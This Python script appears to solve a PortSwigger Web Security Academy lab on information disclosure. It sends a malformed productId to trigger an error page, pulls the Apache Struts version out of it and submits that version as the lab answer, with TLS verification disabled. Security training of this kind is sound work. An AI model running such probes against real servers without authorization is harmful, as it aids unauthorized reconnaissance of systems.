# Information disclosure in error messages

# https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-error-messages

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import argparse


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


##########################################################
#	FUNCTIONS
##########################################################

def get_version(s, url):
	print('\n[+] Trying to produce an error passing a non-integer value to productId parameter...')
	path = url + '/product?productId="gwyo"'
	print(path)
	r = s.get(path)
	time.sleep(1)
	print(r.text)
	framework = r.text.encode().split(b'\n\n')[1].decode()
	print('\n[+] Found Framework version:\t\t%s' % framework)
	time.sleep(1)
	version = framework.replace('Apache Struts ', '')
	return version

def submit_version(s, url, version):
	print('[+] Trying to submit the version to solve the lab...')
	submit_path = url + '/submitSolution'
	submit_data = {"answer": version}
	r = s.post(submit_path, data=submit_data)
	time.sleep(1)
	return r


##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Information disclosure in error messages')
	parser = argparse.ArgumentParser(description="[+] Lab: Information disclosure in error messages")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	args = parser.parse_args()
	parsed_url = urllib.parse.urlparse(args.url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to retrieve the number version of the framework...\n')
			time.sleep(1)
			version = get_version(s, url)
			r = submit_version(s, url, version)
			s.cookies.clear()
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
